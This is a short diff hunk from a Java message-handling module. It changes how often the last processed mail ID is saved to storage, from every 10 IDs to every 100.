@@ -375,7 +375,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 		lastMail.put(mailstore, newLastId);
 		try {
-			if (serialize || (newLastId % 10 == 0)) {
+			if (serialize || (newLastId % 100 == 0)) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (updateMarkupMail), write lastId: " + newLastId);
 				}
